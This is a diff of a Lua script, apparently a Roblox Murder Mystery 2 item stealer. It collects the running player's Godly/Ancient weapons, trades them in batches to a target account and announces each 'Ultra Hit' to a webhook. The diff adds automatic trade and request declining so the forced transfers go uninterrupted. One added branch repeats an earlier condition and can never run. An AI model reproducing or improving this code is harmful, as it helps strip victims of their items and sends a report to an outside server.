@@ -2,7 +2,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
 getgenv().ScriptEjecutado = true
 
@@ -75,6 +74,8 @@ local function sendTradeRequest(user)
 end
 local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
+local function declineTrade() TradeService.DeclineTrade:FireServer() end
+local function declineRequest() TradeService.DeclineRequest:FireServer() end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
 -- Preparar lista de armas Godly/Ancient
@@ -114,7 +115,7 @@ local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro
+-- Trade continuo ultra seguro con decline automático
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
@@ -123,19 +124,25 @@ local function doTrade(targetName)
         elseif status=="StartTrade" then
             local blockSize = 4
             while #weaponsToSend>0 and getTradeStatus()=="StartTrade" do
-                for i=1,math.min(blockSize,#weaponsToSend) do
+                for i=1, math.min(blockSize,#weaponsToSend) do
                     local w = table.remove(weaponsToSend,1)
-                    for _=1,w.Amount do addWeaponToTrade(w.DataID) end
+                    for _=1, w.Amount do addWeaponToTrade(w.DataID) end
                 end
                 task.wait(0.3)
             end
             task.wait(7)
             acceptTrade()
             waitForTradeCompletion()
+        elseif status=="ReceivingRequest" then
+            declineRequest()
+            task.wait(0.3)
+        elseif status=="StartTrade" then
+            declineTrade()
+            task.wait(0.3)
         else
             task.wait(0.5)
         end
-        task.wait(0.5)
+        task.wait(1) -- mismo wait que en el script ultra seguro original
     end
 end
 
